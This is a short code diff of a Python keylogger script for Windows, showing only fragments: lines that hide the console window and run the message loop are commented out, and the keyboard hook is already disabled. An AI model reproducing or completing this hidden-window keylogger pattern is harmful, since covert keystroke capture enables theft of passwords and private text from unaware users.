@@ -8,8 +8,8 @@ import win32console
 import win32gui
 import pythoncom
 
-win = win32console.GetConsoleWindow()
-win32gui.ShowWindow(win, 0)
+#win = win32console.GetConsoleWindow()
+#win32gui.ShowWindow(win, 0)
 
 
 def keylogger():
@@ -37,4 +37,4 @@ def OnKeyboardEvent(event):
 # set the hook
 #hm.HookKeyboard()
 # wait forever
-pythoncom.PumpMessages()
+#pythoncom.PumpMessages()
